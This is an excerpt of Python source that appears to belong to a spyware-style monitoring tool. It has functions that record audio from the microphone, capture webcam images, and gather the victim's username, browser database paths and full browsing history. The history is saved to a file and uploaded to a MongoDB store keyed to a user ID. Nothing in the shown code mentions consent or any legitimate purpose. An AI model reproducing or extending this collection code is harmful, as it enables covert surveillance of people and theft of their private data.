...
# Optional imports - will be handled with try/except
try:
    import cv2
except ImportError:
    cv2 = None
...
def microphone(file_path):
    ...
    if sounddevice is None or write_rec is None:
        log_queue.put("Microphone recording is not available - required libraries not installed")
        return
...
def webcam(file_path):
    ...
    if cv2 is None:
        log_queue.put("Webcam capture is not available - opencv-python not installed")
        return
...
def collect_browser_history():
    try:
        # Get basic browser information without the browserhistory module
        browser_data = []
        
        # Add basic browser info
        try:
            # Check browsers available
            browser_info = {
                "chrome_path": os.path.exists(os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome")),
                "firefox_path": os.path.exists(os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox")),
                "edge_path": os.path.exists(os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge")),
                "time_collected": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            browser_data.append(browser_info)
        except Exception as e:
            log_queue.put(f"Error getting basic browser info: {str(e)}")
            browser_data = ["Error retrieving browser information"]
        ...
        log_queue.put("Browser information collected and uploaded")
        
        try:
            # Try to use browserhistory if it's available
            import browserhistory as bh
            
            # Get more detailed browser history
            detailed_data = []
            
            # Get username
            username = bh.get_username()
            detailed_data.append(username)
            
            # Get database paths
            db_paths = bh.get_database_paths()
            detailed_data.append(db_paths)
            
            # Get history
            history = bh.get_browserhistory()
            detailed_data.append(history)
            
            # Save detailed data
            with open(log_path + 'browser_detailed.txt', 'w') as f:
                f.write(json.dumps(detailed_data))
                
            # Upload to MongoDB
            if user_id:
                save_browser_history_to_db(detailed_data)
                
            log_queue.put("Detailed browser history collected and uploaded")
            
        except ImportError:
            log_queue.put("Detailed browser history module not available")
        except Exception as e:
            log_queue.put(f"Error getting detailed browser history: {str(e)}")
